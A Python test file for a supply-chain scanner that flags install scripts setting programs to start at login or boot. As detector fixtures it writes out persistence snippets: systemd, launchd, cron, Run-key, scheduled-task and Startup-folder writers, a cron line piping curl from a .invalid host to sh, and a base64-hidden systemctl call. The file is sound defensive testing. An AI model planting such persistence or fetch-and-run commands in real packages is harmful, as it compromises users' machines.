"""Programs set to start at login or boot (0.1.8): the install-script test
fails on a systemd unit written or enabled, a launchd agent written or
loaded, a cron job installed, a Windows Run key written, a scheduled task
created, the Startup folder written and an XDG autostart entry. The
CanisterWorm releases of @emilgroup's packages (March 2026) wrote a systemd
user unit that runs a Python payload and enabled it from their postinstall.
Import-time code never gets these reasons: a daemon's `install-service`
command and the auto-launch libraries write the same files when asked. The
native engine (which the npm package runs) is held to these by
js/test/services.test.js, and to its recorded outputs by
tests/architecture/test_snapshot_signs.py.

Everything is inert text: hosts are .invalid, and nothing is written outside
a temporary directory or executed.
"""
import json
import time
import unittest

from tests import _support
from lazaret.scanner import core
from tests.scanner.test_persistence import scan

UNIT_WRITER = (
    "const { execSync } = require('child_process');\nconst fs = require('fs');\nconst os = require('os');\n"
    "const path = require('path');\nconst dir = path.join(os.homedir(), '.config', 'systemd', 'user');\n"
    "fs.mkdirSync(dir, { recursive: true });\n"
    "fs.writeFileSync(path.join(dir, 'pgmon.service'), ['[Unit]', '[Service]', `ExecStart=/usr/bin/python3 ${p}`,\n"
    "  'Restart=always', '[Install]', 'WantedBy=default.target'].join('\\n'));\n"
    "execSync('systemctl --user daemon-reload');\nexecSync('systemctl --user enable pgmon.service');\n")


class ServiceReasonTests(unittest.TestCase):
    def assert_reasons(self, cases, reason):
        for text in cases:
            with self.subTest(text[:50]):
                self.assertEqual(core.service_reasons(text), [reason])

    def assert_none(self, cases):
        for text in cases:
            with self.subTest(text[:50]):
                self.assertEqual(core.service_reasons(text), [])

    def test_systemd(self):
        self.assert_reasons([
            UNIT_WRITER,
            "cp x.service ~/.config/systemd/user/ && systemctl --user daemon-reload",
            "node setup.js && systemctl --user enable --now agent.service",
            "subprocess.run(['systemctl', '--user', 'enable', 'x.service'])",
            "p = Path.home() / '.config' / 'systemd' / 'user' / 'x.service'\n"
            "p.write_text('[Service]\\nExecStart=/usr/bin/python3 ' + s)\n",
            "echo \"$UNIT\" | sudo tee /etc/systemd/system/x.service",
        ], "installs a systemd service")
        self.assert_none([
            "if (fs.existsSync('/run/systemd/system')) fs.writeFileSync(p, s)",       # is systemd running?
            "const units = fs.readdirSync('/etc/systemd/system');\nfs.writeFileSync('log.txt', units.join())",
            "console.log('Run: sudo systemctl enable myapp')",                         # no exec call
            "execSync('systemctl is-enabled docker')",
            "fs.writeFileSync(p, 'ExecStart=/usr/bin/x')",                             # no unit directory
            # a minified line names the directory and writes something else
            "var a=1;" + "x=>y;" * 300 + "fs.existsSync('/etc/systemd/system')&&fs.writeFileSync(o,d)",
        ])

    def test_launchd(self):
        self.assert_reasons([
            "const p = path.join(os.homedir(), 'Library', 'LaunchAgents', 'com.x.plist');\n"
            "fs.writeFileSync(p, `<key>RunAtLoad</key><true/><key>ProgramArguments</key>`);\n",
            "cp com.x.plist ~/Library/LaunchAgents/",
            "execSync(`launchctl load -w ${plist}`)",
            "subprocess.run(['launchctl', 'bootstrap', f'gui/{uid}', p])",
        ], "installs a launchd agent or daemon")
        self.assert_none([
            "const agents = fs.readdirSync(path.join(home, 'Library', 'LaunchAgents'));\nfs.writeFileSync(out, x);\n",
            "execSync('launchctl list')",
        ])

    def test_cron(self):
        self.assert_reasons([
            "os.system('(crontab -l 2>/dev/null; echo \"@reboot python3 ~/.x/a.py\") | crontab -')",
            "exec(`(crontab -l; echo '*/5 * * * * curl -s https://x.invalid | sh') | crontab -`)",
            "subprocess.run(['crontab', tmp])",
            "os.system('crontab /tmp/cr')",
            "from crontab import CronTab\ncron = CronTab(user=True)\njob = cron.new(command=cmd)\njob.every_reboot()\n"
            "cron.write()\n",
            "with open('/etc/cron.d/updater', 'w') as f:\n    f.write(line)\n",
        ], "adds a cron job")
        self.assert_none([
            "execSync('crontab -l')", "subprocess.run(['crontab', '-l'])", "exec('echo | crontab -l')",
            "print('add this line to your crontab: 0 * * * * x')", "open('/etc/crontab').read()",
            "x = 'a|cron|crontab|csplit|curl'; exec(x)",                               # a highlighter's word list
        ])

    def test_run_keys(self):
        self.assert_reasons([
            "k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0,"
            " winreg.KEY_SET_VALUE)\nwinreg.SetValueEx(k, 'Updater', 0, winreg.REG_SZ, exe)\n",
            "execSync('reg add \"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" /v x /t REG_SZ /d \"'"
            " + exe + '\" /f')",
            "New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name x -Value $p",
            "spawn('reg', ['add', 'HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce', '/v', 'x'])",
            "regedit.putValue({ 'HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run': { x: { value: p } } })",
        ], "adds a program to a Windows Run key")
        self.assert_none([
            "winreg.QueryValueEx(winreg.OpenKey(HKCU, r'Software\\Microsoft\\Windows\\CurrentVersion\\Run'), 'x')",
            # a registry library: a docstring names a Run key far from its write calls
            "# r['HKLM\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Run']['Example 1'] = 'x'\n"
            + "#\n" * 300 + "win32.RegSetValueEx(h, n, v)",
            "CurrentVersion\\Runner reg add",
        ])

    def test_the_run_key_span_counts_code_points(self):
        # the write must end within the span: REG_SZ right at its end, and one code point past it
        near = "CurrentVersion\\Run" + "\U0001F600" * (_support.pack("_SVC_RUNKEY_SPAN") - 6) + "REG_SZ"
        far = "CurrentVersion\\Run" + "\U0001F600" * (_support.pack("_SVC_RUNKEY_SPAN") - 5) + "REG_SZ"
        self.assertEqual(core.service_reasons(near), ["adds a program to a Windows Run key"])
        self.assertEqual(core.service_reasons(far), [])

    def test_scheduled_tasks(self):
        self.assert_reasons([
            "execSync(`schtasks /create /tn Updater /tr \"${exe}\" /sc onlogon /f`)",
            "subprocess.run(['schtasks', '/Create', '/SC', 'ONLOGON', '/TN', 'x', '/TR', exe])",
            "@echo off\nSCHTASKS.EXE /CREATE /SC ONSTART /TN x /TR c:\\x.exe\n",
            "Register-ScheduledTask -TaskName x -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Action $a",
            "var s = new ActiveXObject('Schedule.Service'); f.RegisterTaskDefinition('x', d, 6)",
        ], "creates a Windows scheduled task")
        self.assert_none(["execSync('schtasks /query /fo csv')", '"ecs:RegisterTaskDefinition",'])

    def test_startup_folder_and_autostart(self):
        self.assert_reasons([
            "p = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')\n"
            "shutil.copy(exe, p)\n",
            "copy x.exe \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"",
            "s = shell.CreateShortcut(os.path.join(winshell.startup(), 'x.lnk'))\ns.Save()\n",
        ], "puts a program in the Windows Startup folder")
        self.assert_reasons([
            "const f = path.join(os.homedir(), '.config', 'autostart', 'x.desktop');\nfs.writeFileSync(f, entry);\n",
        ], "adds a desktop autostart entry")
        self.assert_none([
            "os.listdir(os.path.join(appdata, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'))",
            "const cfg = {'autostart': true}; fs.writeFileSync('c.json', JSON.stringify(cfg));",
            "fs.readdirSync(path.join(home, '.config', 'autostart'))",
        ])

    def test_several_at_once_in_a_fixed_order(self):
        text = ("execSync('schtasks /create /sc onlogon /tn x /tr y');\n"
                "execSync('(crontab -l; echo \"@reboot x\") | crontab -');\n"
                "execSync('systemctl --user enable x');\n")
        self.assertEqual(core.service_reasons(text), ["installs a systemd service", "adds a cron job",
                                                      "creates a Windows scheduled task"])

    def test_in_the_install_script_test_not_at_import_time(self):
        self.assertEqual(core.install_script_risk(UNIT_WRITER), ["installs a systemd service"])
        self.assertEqual(core.persistence_reasons(UNIT_WRITER), ["installs a systemd service"])
        self.assertEqual(core.import_time_risk(UNIT_WRITER, "js"), ([], None))
        # and in the strings a file decodes as it runs
        hidden = ("const { execSync } = require('child_process');\n"
                  "execSync(Buffer.from('c3lzdGVtY3RsIC0tdXNlciBlbmFibGUgeC5zZXJ2aWNl', 'base64').toString());\n")
        self.assertEqual(core.install_script_risk(hidden), ["installs a systemd service" + _support.pack("_DV_NOTE")])

    def test_hostile_texts_finish_fast(self):
        cases = ["systemctl -a" * 200_000, "| crontab " * 200_000, "CurrentVersion\\Run " * 200_000,
                 "reg " + " " * 1_000_000, "'systemd', 'user', " * 100_000 + "fs.writeFileSync(",
                 "LaunchAgents x\n" * 200_000, "schtasks " * 200_000 + "\n", "(" * 1_000_000,
                 "\n" + " " * 1_000_000, "/etc/cron.d/x " * 100_000 + "\n"]
        for text in cases:
            start = time.monotonic()
            core.service_reasons(text)
            self.assertLess(time.monotonic() - start, 5, text[:30])


class ServiceHookTests(unittest.TestCase):
    def hooks(self, files):
        res = scan(files, include_deps=True)
        return [(i["sev"], i["msg"]) for i in res["issues"] if i["rule"] == "SC-INSTALL-HOOK"]

    def test_install_hook_command(self):
        self.assertEqual(self.hooks({"node_modules/p/package.json": json.dumps(
            {"name": "p", "version": "1.0.0", "scripts": {"postinstall": "systemctl --user enable --now p.service"}})}),
            [("CRITICAL", '"postinstall" script installs a systemd service.')])

    def test_followed_install_script(self):
        self.assertEqual(self.hooks({"node_modules/p/package.json": json.dumps(
            {"name": "p", "version": "1.0.0", "scripts": {"postinstall": "node index.js"}}),
            "node_modules/p/index.js": UNIT_WRITER}),
            [("CRITICAL", "Install hook runs index.js, which installs a systemd service.")])

    def test_import_time_code_is_not_judged(self):
        res = scan({"node_modules/p/package.json": json.dumps({"name": "p", "version": "1.0.0", "main": "index.js"}),
                    "node_modules/p/index.js": UNIT_WRITER}, include_deps=True)
        self.assertEqual([i for i in res["issues"] if i["rule"] in ("SC-INSTALL-HOOK", "SC-IMPORT-RISK")], [])


if __name__ == "__main__":
    unittest.main()
